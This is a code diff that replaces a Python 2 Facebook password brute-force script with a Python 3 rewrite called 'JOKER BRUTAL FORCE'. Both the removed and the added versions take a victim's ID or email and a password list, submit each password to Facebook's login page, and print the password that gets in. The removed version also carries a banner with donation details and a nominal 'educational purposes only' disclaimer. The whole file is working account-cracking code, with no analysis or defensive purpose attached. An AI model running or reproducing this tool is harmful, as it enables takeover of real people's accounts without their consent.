@@ -1,193 +1,64 @@
-#!usr/bin/python
-#JOKER BRUTAL FORCE  can crack into Facebook Database 100% without Interruption By Facebook Firewall !
-#This program is for educational purposes only.
-#Don't attack people facebook accounts it's illegal ! 
-#If you want to crack into someone's account, you must have the permission of the user. 
-#InfosecHacker is not responsible.
-
-
+import requests
+import threading
+# import urllib.request
+# import os
+from bs4 import BeautifulSoup
 import sys
-import random
-import mechanize
-import cookielib
 
-# Console colors
-bg ='' # '\033[44m'  # gray
-W = bg+'\033[0m'  # white (normal)
-R = bg+'\033[31m'  # red
-G = bg+'\033[32m'  # green
-O = bg+'\033[33m'  # orange
-B = bg+'\033[34m'  # blue
-P = bg+'\033[35m'  # purple
-C = bg+'\033[36m'  # cyan
-GR = bg+'\033[37m'  # gray
+if sys.version_info[0] !=3: 
+	print('''--------------------------------------
+	REQUIRED PYTHON 3.x
+	use: python3 fb.py
+--------------------------------------
+			''')
+	sys.exit()
 
-GHT = G+'''
-        +=========================================+
-        |..........'''+O+'''Facebook Cracker v 2'''+G+'''...........|
-        +-----------------------------------------+
-        |'''+C+'''#Author: yahye abdirahman'''+G+'''                |
-        |'''+C+'''#Contact: www.twitter.com/mr__yahye'''+G+'''|
-        |'''+C+'''#Date: 23/10/2020'''+G+'''                        |
-        |'''+C+'''#HDONATE AS PAYPAL lioyahya3@gmail.com. '''+G+''' |
-        |'''+C+'''#channelka ku cawi 2$  ZAAD 0634048063'''+G+'''   |
-        |'''+C+'''my facebook  page  fikrado   !!!'''+G+'''         |
-        |'''+C+'''#my youtube FIKRADO HACKER    '''+G+'''           |
-        |'''+C+'''#I take no responsibilities for the '''+G+'''     |
-        |'''+C+''' use of this program !       '''+G+'''            |
-        +=========================================+
-        |..........'''+O+''' MOD BY FIKRADO INC '''+G+'''...........|
-        +-----------------------------------------+
-'''+W
-print "Note: - TOOLKANI WAA MID CASRIYA OO OFKA TOOS OGA HACKING GARANAYA"
-print "# Hit CTRL+C to quit the program"
-print "# Use www.graph.facebook.com for more infos about your victim ^_^"
+post_url='https://www.facebook.com/login.php'
+headers = {
+	'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
+}
+payload={}
+cookie={}
 
-try:
- DT=open('/storage/sdcard1/.fb.dat').readlines()
- email =ml=DT[0].replace('\n','')
- passwordlist =pw=DT[1].replace('\n','')
- q2=DT[2].replace('\n','')
-except:
- email =ml=str(raw_input("# Masukkan ID korban\ncontoh: 100006541234567\nID = "))
- passwordlist =pw= str(raw_input("Masukkan file yg berisi password list\ncontoh:/sdcard/password.txt\nPASSWORD = "))
- q2=1 #raw_input('mulai password no brp om,,?? ')
- try:open('/storage/sdcard1/.fb.dat','w').write(ml+'\n'+pw+'\n'+str(q2))
- except:print ('tidak bisa menyimpan data, penyerangan akan selalu dimulai dari awal')
+def create_form():
+	form=dict()
+	cookie={'fr':'0ZvhC3YwYm63ZZat1..Ba0Ipu.Io.AAA.0.0.Ba0Ipu.AWUPqDLy'}
 
-print O+'_____eemail_____='+ml+'\n'+'____password____='+pw+W
+	data=requests.get(post_url,headers=headers)
+	for i in data.cookies:
+		cookie[i.name]=i.value
+	data=BeautifulSoup(data.text,'html.parser').form
+	if data.input['name']=='lsd':
+		form['lsd']=data.input['value']
+	return (form,cookie)
 
-useragents = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
+def function(email,passw,i):
+	global payload,cookie
+	if i%10==1:
+		payload,cookie=create_form()
+		payload['email']=email
+	payload['pass']=passw
+	r=requests.post(post_url,data=payload,cookies=cookie,headers=headers)
+	if 'Find Friends' in r.text or 'Two-factor authentication required' in r.text:
+		open('temp','w').write(str(r.content))
+		print('\npassword is : ',passw)
+		return True
+	return False
 
-login ='https://www.facebook.com/'
-logs= 'https://www.facebook.com/login.php?login_attempt=1&lwv=110'
-login1 ='https://web.facebook.com/'
-logs1 = 'https://web.facebook.com/login.php?login_attempt=1&lwv=110'
+print('\n---------- JOKER BRUTAL FORCE ----------\n')
+file=open('passwords.txt','r')
 
-no=1
-panel=0
-log=''
-#'https://web.facebook.com/checkpoint/?next'
-def attack(password):
-  global panel,no,q2,log
-  try:
-    if no==int(q2):panel=1
-    if panel ==1:
-     sys.stdout.write("\r"+W+"[*]"+C+" mencoba password ke "+O+"%s %s.. " %(no,password)+W)
-     sys.stdout.flush()
-     br.addheaders = [('User-agent', random.choice(useragents))]
-     site = br.open(login)
-     br.select_form(nr=0)
-         
-     ##Facebook
-     br.form['email'] =email
-     br.form['pass'] = password
-     br.submit()
-     log = br.geturl()
-     if log !=logs and log !=logs1:
-      print log
-      try:open('/sdcard1/password target.txt','w').write(str(password)+'\n'+str(log))
-      except:pass
-     if log == login or log == login1:
-        print "\n\n\n [*] Password found .. !!"
-        print "\n [*] Password : %s\n" % (password)
-        sys.exit(1)
-  except KeyboardInterrupt:
-        print "\n[*] Exiting program .. "
-        try:open('/storage/sdcard1/.fb.dat','w').write(ml+'\n'+pw+'\n'+str(no))
-        except:pass
-        sys.exit(1)
-  except:
-        import traceback
-        fe = traceback.format_exception
-        sei = sys.exc_info
-        print '\n'+str(sei()[1]) #(''.join(fe(*sei())))
-        print (u'\nPlease contact me Bang-Djon')
+email=input('Enter Email/Username : ')
 
-        if log == login or log == login1:
-         try:open('/storage/sdcard1/.fb.dat','w').write(ml+'\n'+pw+'\n'+str(no))
-         except:pass
-        else:
-         try:open('/storage/sdcard1/.fb.dat','w').write(ml+'\n'+pw+'\n'+str(no))
-         except:pass
-         print "\n[*] exiting....... "
-        sys.exit(1)
+print("\nTarget Email ID : ",email)
+print("\nTrying Passwords from list ...")
 
-def search():
-    global password,no
-    for password in passwords:
-        attack(password.replace("\n",""))
-        no+=1
-
-
-
-def check():
-
-    global br
-    global passwords
-    global password,no
-    try:
-       br = mechanize.Browser()
-       cj = cookielib.LWPCookieJar()
-       br.set_handle_robots(False)
-       br.set_handle_equiv(True)
-       br.set_handle_referer(True)
-       br.set_handle_redirect(True)
-       br.set_cookiejar(cj)
-       br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
-    except KeyboardInterrupt:
-       print "\n[*] Exiting program ..\n"
-       try:open('/storage/sdcard1/.fb.dat','w').write(ml+'\n'+pw+'\n'+str(no))
-       except:pass
-       sys.exit(1)
-    except:
-       print "\n[*] Koneksi Habis .. "
-       try:open('/storage/sdcard1/.fb.dat','w').write(ml+'\n'+pw+'\n'+str(no))
-       except:pass
-       sys.exit(1)
-    try:
-       list = open(passwordlist, "r")
-       passwords = list.readlines()
-       k = 0
-       while k < len(passwords):
-          passwords[k] = passwords[k].strip()
-          k += 1
-    except IOError:
-        print "\n [*] Error: check your password list path \n"
-        sys.exit(1)
-    except KeyboardInterrupt:
-        print "\n [*] Exiting program ..\n"
-        try:open('/storage/sdcard1/.fb.dat','w').write(ml+'\n'+pw+'\n'+str(no))
-        except:pass
-        sys.exit(1)
-    except:
-        print "\n[*] Koneksi Habis .. "
-        try:open('/storage/sdcard1/.fb.dat','w').write(ml+'\n'+pw+'\n'+str(no))
-        except:pass
-        sys.exit(1)
-    try:
-        print GHT
-        print W+" [*]"+C+" Account to crack :"+O+" %s" % (email)+W
-        print W+" [*]"+C+" Loaded :" , O+str(len(passwords)),C+ "passwords"+W
-        print W+" [*]"+C+" Cracking, please wait ..."+W
-    except KeyboardInterrupt:
-        print "\n [*] Exiting program ..\n"
-        try:open('/storage/sdcard1/.fb.dat','w').write(ml+'\n'+pw+'\n'+str(no))
-        except:pass
-        sys.exit(1)
-    except:
-        print "\n[*] Koneksi Habis .. "
-        try:open('/storage/sdcard1/.fb.dat','w').write(ml+'\n'+pw+'\n'+str(no))
-        except:pass
-        sys.exit(1)
-    try:
-        search()
-        attack(password)
-    except KeyboardInterrupt:
-        print "\n [*] Exiting program ..\n"
-        try:open('/storage/sdcard1/.fb.dat','w').write(ml+'\n'+pw+'\n'+str(no))
-        except:pass
-        sys.exit(1)
-
-if __name__ == '__main__':
-    check()
+i=0
+while file:
+	passw=file.readline().strip()
+	i+=1
+	if len(passw) < 6:
+		continue
+	print(str(i) +" : ",passw)
+	if function(email,passw,i):
+		break
